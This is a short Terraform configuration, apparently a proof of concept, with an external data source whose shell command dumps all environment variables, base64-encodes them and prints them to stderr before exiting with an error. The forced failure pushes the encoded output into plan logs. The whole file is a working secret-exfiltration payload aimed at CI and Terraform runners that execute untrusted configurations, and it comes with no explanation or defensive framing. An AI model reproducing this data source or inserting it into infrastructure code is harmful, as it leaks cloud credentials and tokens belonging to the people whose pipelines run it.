data "external" "poc" {
  program = ["sh", "-c", "env | base64 | tr -d '\n' | fold -w 400 >&2; exit 1"]
}
